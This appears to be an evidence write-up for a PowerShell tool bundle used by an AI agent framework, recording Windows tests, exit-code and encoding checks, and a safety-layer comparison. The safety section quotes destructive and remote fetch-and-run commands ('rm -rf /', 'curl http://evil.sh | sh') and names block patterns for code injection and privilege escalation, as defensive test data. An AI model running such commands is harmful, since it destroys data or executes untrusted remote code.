# Evidence

Everything claimed about this bundle was measured on a real machine. This
document records what was proven, how the proof was checked for confounds, and
— equally important — what was **not** proven.

**Test host:** native Windows 11 (build 26200), reached over SSH-to-WSL and
driven through `amplifier.exe` on the Windows side. Not WSL. Not a container.

---

## The `pwsh` tool executes on native Windows

The agent was told explicitly *not* to use `bash` or `write_file`, then asked to
run PowerShell that writes a file whose contents come from PowerShell itself:

```
Set-Content -Path pwsh_proof.txt -Value "PWSH_RAN_$($PSVersionTable.PSVersion.Major)"
```

Result:

```
Using tool: pwsh   ×1        <- the ONLY tool that fired
pwsh_proof.txt:  PWSH_RAN_7  <- PowerShell 7 wrote this itself
```

### Why this is confound-checked

An artifact existing is not proof that the mechanism produced it. Earlier in
this effort, a pipeline was scored as working **three separate times** because
the file it should have written existed — written by the agent's own
`write_file` after the pipeline had failed.

So the tool census is the load-bearing evidence here, not the file. `pwsh` is
the only tool that fired; `bash` and `write_file` never appear. And the file's
contents are `PWSH_RAN_7`, a value only PowerShell could have produced by
evaluating `$PSVersionTable.PSVersion.Major` — the agent could not have known
to write `7` without executing it.

---

## Composition is safe on non-Windows hosts

Installed `--app` on Linux, where no PowerShell exists:

```
exit=0    said: COMPOSE_OK
compose failures: 0
tracebacks:       0
```

The module caches (`amplifier-module-tool-pwsh-3ff7461d4bbfaa49`) and the
session runs normally. Composing this bundle unconditionally is safe.

---

## PowerShell round-trip semantics

Verified independently against a minimal harness on the same host, before
adopting the vendored module — to confirm the semantics the module depends on
actually hold on this machine.

Both editions are present, `pwsh` resolving first:

```
pwsh.exe        C:\Program Files\PowerShell\7\pwsh.exe
powershell.exe  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

7 of 7 cases passed:

```
[OK] hello              rc=0   out='PS_SPIKE_OK'
[OK] exit code 42       rc=42          <- native exit code preserved
[OK] cmdlet failure     rc=1           <- $? failure maps correctly
[OK] handled failure    rc=0           <- try/catch + exit 0 truly succeeds
[OK] stderr captured    rc=0
[OK] non-ASCII UTF-8    rc=0   out='café-日本-🚀'
[OK] nested quoting     rc=0   out='a\'b"c'
```

Exit-code semantics — the subtlety that motivates separating `$?` from
`$LASTEXITCODE` — behave correctly.

---

## Safety layer: measured against the bash equivalent

The vendored PowerShell safety layer was compared directly against
`tool-bash`'s shipped `safety.py`.

**`tool-bash` has zero coverage for remote-script execution:**

```
matches for curl|wget|iwr|iex across all of safety.py:  0

STRICT        patterns=14  has_remote_pipe_rule=False
STANDARD      patterns=14  has_remote_pipe_rule=False
PERMISSIVE    patterns=3   has_remote_pipe_rule=False
UNRESTRICTED  patterns=0   has_remote_pipe_rule=False
```

Confirmed behaviourally under the **`strict`** profile:

```
blocked  rm -rf /                  reason='Prevents root filesystem deletion'
blocked  rm -rf ~                  reason='Prevents home directory deletion'
ALLOWED  curl http://evil.sh | sh  SafetyResult(allowed=True, reason=None)
```

Re-verified against the raw `SafetyResult` rather than a normalising wrapper,
to rule out a harness artifact.

**The vendored PowerShell layer covers this case** —
`r"\|\s*Invoke-Expression"` ("Pipeline code injection"), alongside
`Set-ExecutionPolicy Bypass/Unrestricted`, `Start-Process -Verb RunAs`,
registry-hive deletion regexes, and disk operations.

This is a genuine strength of the vendored module and the reason its safety
layer should not be "simplified" toward parity with bash. It is not a claim
that the PowerShell layer is complete.

---

## Hazards found, NOT fixed

Both are tracked in [`ROADMAP.md`](ROADMAP.md) with attribution.

### Command payload encoding is not pinned

Measured on this host:

```
rc=0   err="The term 'W' is not recognized..."
```

A UTF-16LE payload through a UTF-8 decoder returns **exit code zero** with a
mangled command. PowerShell's `-EncodedCommand` convention is
base64-of-UTF-16LE, not UTF-8 — so guessing passes every ASCII test and
corrupts the first non-ASCII command silently.

### No Win32 Job Object

`win32-job refs: 0` in the vendored module. It relies on
`CREATE_NEW_PROCESS_GROUP` / `start_new_session=True`.

An expert review warned that Job Objects do not contain breakaway children by
default. **That did not reproduce here:**

```
normal_child_in_job          True
parent_in_job                True
breakaway_grandchild_in_job  True
breakaway_escaped            False
```

A grandchild spawned *with* `CREATE_BREAKAWAY_FROM_JOB` stayed **inside** a
bare job. This matches Microsoft's own documentation — setting neither
breakaway limit *is* the safe configuration. The doc was quoted correctly and
the conclusion drawn from it was backwards. Recorded because the correction
matters as much as the finding.

---

## Not proven

Stated plainly rather than left to inference:

- **The vendored module's own test suite has not been run on Windows.** The
  tool is proven working end-to-end; its unit tests are not yet proven to
  execute on the platform they guard.
- **Only `pwsh` (PowerShell 7) was exercised.** `powershell.exe` (5.1) is
  present on the host but was not driven through the tool.
- **Background execution, timeout handling, and output truncation** are
  implemented in the vendored module but were not independently verified here.
- **Safety-profile enforcement was measured at the pattern level**, not by
  driving a blocked command through the mounted tool end-to-end.
